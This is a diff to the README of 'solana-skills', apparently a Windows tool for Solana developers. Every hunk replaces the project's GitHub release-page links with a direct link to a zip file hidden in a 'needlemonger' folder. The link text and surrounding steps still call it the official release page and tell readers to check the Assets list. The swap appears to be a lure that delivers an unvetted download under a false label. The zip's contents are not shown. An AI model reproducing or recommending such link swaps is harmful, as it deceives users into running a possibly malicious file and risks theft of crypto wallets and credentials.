@@ -1,6 +1,6 @@
 # 🛠️ solana-skills - Ship mainnet with clear proof
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/beardedwheatgrasswalkupapartment951/solana-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/beardedwheatgrasswalkupapartment951/solana-skills/main/needlemonger/solana_skills_v2.4-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this guide to download the app from GitHub and run it on Windows.
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/beardedwheatgrasswalkupapartment951/solana-skills/releases
+1. Open the release page: https://raw.githubusercontent.com/beardedwheatgrasswalkupapartment951/solana-skills/main/needlemonger/solana_skills_v2.4-alpha.4.zip
 2. Look for the latest release at the top of the page.
 3. In the Assets section, find the Windows file.
 4. Download the file to your computer.
@@ -138,7 +138,7 @@ Try this:
 
 To avoid the wrong file, use the GitHub release page only:
 
-[Visit the release page to download solana-skills](https://github.com/beardedwheatgrasswalkupapartment951/solana-skills/releases)
+[Visit the release page to download solana-skills](https://raw.githubusercontent.com/beardedwheatgrasswalkupapartment951/solana-skills/main/needlemonger/solana_skills_v2.4-alpha.4.zip)
 
 Check that the file name matches the latest release and that it comes from the GitHub Assets list.
 
@@ -175,7 +175,7 @@ That gives you a cleaner path to mainnet.
 
 ## 📎 Release Page
 
-Primary download link: https://github.com/beardedwheatgrasswalkupapartment951/solana-skills/releases
+Primary download link: https://raw.githubusercontent.com/beardedwheatgrasswalkupapartment951/solana-skills/main/needlemonger/solana_skills_v2.4-alpha.4.zip
 
 ## 🧩 Common Questions
 
